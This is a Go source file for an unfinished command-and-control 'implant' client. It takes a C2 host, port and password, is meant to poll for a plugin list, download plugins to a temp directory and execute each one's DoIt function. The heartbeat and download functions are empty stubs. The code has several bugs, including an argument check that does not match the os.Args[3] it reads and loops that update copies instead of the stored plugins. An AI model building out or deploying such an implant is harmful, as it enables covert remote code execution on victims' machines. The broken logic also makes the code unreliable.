package main

import (
	"fmt"
	"log"
	"os"
	"plugin"
	"strconv"
)

type ImplantPlugin struct {
	PluginId     string //GUID
	PluginName   string
	PluginFile   string
	PluginUrl    string
	PluginResult string
}

type ImplantClient struct {
	Server       string
	Port         int
	C2Pass       string
	PluginsToRun []ImplantPlugin
}

func CheckError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func (implantClient ImplantClient) DownloadPlugin(pluginUrl string) (string, error) {
	return "", nil
}

func (implantClient ImplantClient) DownloadPlugins() error {
	for _, pluginDoDownload := range implantClient.PluginsToRun {
		pluginBase64 := ""
		//Write plugins to temp dir
		path, err := implantClient.WritePluginToTempDir(pluginBase64)
		if err != nil {
			return nil
		}
		pluginDoDownload.PluginFile = path
	}
	return nil
}

func (implantClient ImplantClient) WritePluginToTempDir(base64Plugin string) (string, error) {
	return "", nil
}

func (implantClient ImplantClient) ExecutePlugins() error {
	for _, pluginToRun := range implantClient.PluginsToRun {
		plugin, err := plugin.Open(pluginToRun.PluginFile)
		if err != nil {
			return err
		}

		doItSymbol, err := plugin.Lookup("DoIt")
		if err != nil {
			return err
		}

		doItFunc, ok := doItSymbol.(func() (string, error))
		if !ok {
			fmt.Println("Could not do the thing")
		}

		result, err := doItFunc()
		if err != nil {
			return err
		}

		fmt.Println("RESULT: " + result)
		pluginToRun.PluginResult = result
	}
	return nil
}

func (implantClient ImplantClient) HeartBeat() error {
	//Call C2 server get json list of plugins
	//Update Plugin list
	return nil
}

func (implantClient ImplantClient) Loop() error {
	err := implantClient.HeartBeat()
	if err != nil {
		return err
	}
	//Download plugins
	err = implantClient.DownloadPlugins()
	if err != nil {
		return err
	}
	//Execute plugins
	err = implantClient.ExecutePlugins()
	if err != nil {
		return err
	}
	return nil
}

func (implantClient ImplantClient) ClearPluginList() error {
	implantClient.PluginsToRun = nil
	return nil
}

func main() {
	if len(os.Args) != 3 {
		log.Fatal("Missing arguments. Please correct.")
	}

	host := os.Args[1]
	port := os.Args[2]
	c2_pass := os.Args[3]
	portNo, err := strconv.Atoi(port)
	CheckError(err)

	fmt.Println("Connecting to " + host + " with port " + port)

	implant := &ImplantClient{
		Server:       host,
		Port:         portNo,
		C2Pass:       c2_pass,
		PluginsToRun: make([]ImplantPlugin, 10),
	}

	err = implant.Loop()
	CheckError(err)

	// mod := os.Args[1]
	// plugin, err := plugin.Open(mod)
	// CheckError(err)

	// doItSymbol, err := plugin.Lookup("DoIt")
	// CheckError(err)

	// doItFunc, ok := doItSymbol.(func() (string, error))
	// if !ok {
	// 	fmt.Println("Could not do the thing")
	// }

	// result, err := doItFunc()
	// CheckError(err)

	// fmt.Println("RESULT: " + result)

	// symSpeaker, err := plugin.Lookup("Speaker")
	// CheckError(err)

	// var speaker Speaker
	// speaker, ok := symSpeaker.(Speaker)
	// if !ok {
	// 	return errors.New("unexpected type from module symbol")
	// }

	// speaker.Speak()
}
